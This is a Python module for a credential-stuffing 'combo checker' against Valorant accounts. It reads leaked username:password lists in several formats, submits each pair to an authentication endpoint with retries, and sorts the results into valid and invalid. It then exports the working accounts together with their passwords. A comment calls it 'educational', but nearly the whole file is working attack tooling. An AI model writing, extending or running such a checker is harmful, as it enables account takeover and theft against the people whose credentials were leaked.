"""
Core combo checking functionality for Valorant accounts
"""

import requests
import time
import logging
import json
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlencode
import threading
from config import (
    REQUEST_TIMEOUT, MAX_RETRIES, USER_AGENT,
    DEFAULT_DELAY_BETWEEN_CHECKS, VALORANT_AUTH_URL
)

class ComboChecker:
    """Main class for checking Valorant account combinations"""
    
    def __init__(self, delay: float = DEFAULT_DELAY_BETWEEN_CHECKS):
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': USER_AGENT,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        self.results = []
        self.is_checking = False
        self.stop_checking = False
        self.logger = logging.getLogger(__name__)
        
    def check_single_combo(self, username: str, password: str) -> Dict:
        """
        Check a single username/password combination
        
        Args:
            username: Email or username
            password: Password
            
        Returns:
            Dict containing check results
        """
        result = {
            'username': username,
            'password': password,
            'status': 'unknown',
            'message': '',
            'timestamp': time.time()
        }
        
        try:
            # Implement basic authentication check
            # Note: This is a simplified version for educational purposes
            auth_data = {
                'type': 'auth',
                'username': username,
                'password': password,
                'remember': False
            }
            
            # Make the authentication request
            response = self._make_request(VALORANT_AUTH_URL, auth_data)
            
            if response is None:
                result['status'] = 'error'
                result['message'] = 'Request failed'
                return result
                
            # Analyze the response
            if response.status_code == 200:
                response_data = response.json()
                
                # Check for successful authentication indicators
                if 'access_token' in response_data or response_data.get('type') == 'response':
                    result['status'] = 'valid'
                    result['message'] = 'Authentication successful'
                else:
                    result['status'] = 'invalid'
                    result['message'] = 'Invalid credentials'
                    
            elif response.status_code == 429:
                result['status'] = 'rate_limited'
                result['message'] = 'Rate limited - try again later'
                
            elif response.status_code in [401, 403]:
                result['status'] = 'invalid'
                result['message'] = 'Invalid credentials'
                
            else:
                result['status'] = 'error'
                result['message'] = f'HTTP {response.status_code}'
                
        except requests.exceptions.Timeout:
            result['status'] = 'timeout'
            result['message'] = 'Request timed out'
            
        except requests.exceptions.ConnectionError:
            result['status'] = 'connection_error'
            result['message'] = 'Connection failed'
            
        except Exception as e:
            result['status'] = 'error'
            result['message'] = f'Unexpected error: {str(e)}'
            self.logger.error(f"Error checking {username}: {e}")
            
        return result
    
    def _make_request(self, url: str, data: Dict) -> Optional[requests.Response]:
        """Make HTTP request with retry logic"""
        for attempt in range(MAX_RETRIES):
            try:
                response = self.session.post(
                    url,
                    json=data,
                    timeout=REQUEST_TIMEOUT
                )
                return response
                
            except requests.exceptions.RequestException as e:
                self.logger.warning(f"Request attempt {attempt + 1} failed: {e}")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)  # Exponential backoff
                    
        return None
    
    def check_combo_list(self, combos: List[Tuple[str, str]], 
                        progress_callback=None, result_callback=None) -> List[Dict]:
        """
        Check a list of username/password combinations
        
        Args:
            combos: List of (username, password) tuples
            progress_callback: Function to call with progress updates
            result_callback: Function to call with individual results
            
        Returns:
            List of result dictionaries
        """
        self.is_checking = True
        self.stop_checking = False
        results = []
        
        total_combos = len(combos)
        
        for i, (username, password) in enumerate(combos):
            if self.stop_checking:
                break
                
            # Update progress
            if progress_callback:
                progress_callback(i, total_combos)
                
            # Check the combination
            result = self.check_single_combo(username, password)
            results.append(result)
            
            # Call result callback
            if result_callback:
                result_callback(result)
                
            # Log the result
            self.logger.info(f"Checked {username}: {result['status']}")
            
            # Apply rate limiting (except for last item)
            if i < total_combos - 1 and not self.stop_checking:
                time.sleep(self.delay)
                
        self.is_checking = False
        return results
    
    def stop_checking_process(self):
        """Stop the current checking process"""
        self.stop_checking = True
        
    def parse_combo_file(self, file_path: str) -> List[Tuple[str, str]]:
        """
        Parse combo file and return list of (username, password) tuples
        
        Args:
            file_path: Path to the combo file
            
        Returns:
            List of (username, password) tuples
        """
        combos = []
        
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                for line_num, line in enumerate(file, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                        
                    # Support multiple formats
                    if ':' in line:
                        parts = line.split(':', 1)
                    elif ',' in line:
                        parts = line.split(',', 1)
                    elif ';' in line:
                        parts = line.split(';', 1)
                    elif '\t' in line:
                        parts = line.split('\t', 1)
                    else:
                        self.logger.warning(f"Line {line_num}: Invalid format - {line}")
                        continue
                        
                    if len(parts) == 2:
                        username = parts[0].strip()
                        password = parts[1].strip()
                        if username and password:
                            combos.append((username, password))
                        else:
                            self.logger.warning(f"Line {line_num}: Empty username or password")
                    else:
                        self.logger.warning(f"Line {line_num}: Invalid format - {line}")
                        
        except FileNotFoundError:
            raise FileNotFoundError(f"File not found: {file_path}")
        except Exception as e:
            raise Exception(f"Error reading file {file_path}: {e}")
            
        return combos
    
    def export_results(self, results: List[Dict], file_path: str, format_type: str = 'txt'):
        """
        Export results to file
        
        Args:
            results: List of result dictionaries
            file_path: Output file path
            format_type: Export format ('txt' or 'csv')
        """
        try:
            if format_type.lower() == 'csv':
                import csv
                with open(file_path, 'w', newline='', encoding='utf-8') as file:
                    writer = csv.writer(file)
                    writer.writerow(['Username', 'Password', 'Status', 'Message', 'Timestamp'])
                    
                    for result in results:
                        writer.writerow([
                            result['username'],
                            result['password'],
                            result['status'],
                            result['message'],
                            time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(result['timestamp']))
                        ])
            else:
                # Text format
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write("Valorant Account Combo Check Results\n")
                    file.write("=" * 50 + "\n\n")
                    
                    valid_count = sum(1 for r in results if r['status'] == 'valid')
                    invalid_count = sum(1 for r in results if r['status'] == 'invalid')
                    error_count = len(results) - valid_count - invalid_count
                    
                    file.write(f"Summary:\n")
                    file.write(f"Total checked: {len(results)}\n")
                    file.write(f"Valid accounts: {valid_count}\n")
                    file.write(f"Invalid accounts: {invalid_count}\n")
                    file.write(f"Errors: {error_count}\n\n")
                    
                    file.write("Detailed Results:\n")
                    file.write("-" * 30 + "\n")
                    
                    for result in results:
                        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', 
                                                time.localtime(result['timestamp']))
                        file.write(f"Username: {result['username']}\n")
                        file.write(f"Status: {result['status']}\n")
                        file.write(f"Message: {result['message']}\n")
                        file.write(f"Time: {timestamp}\n")
                        file.write("-" * 30 + "\n")
                        
        except Exception as e:
            raise Exception(f"Error exporting results: {e}")
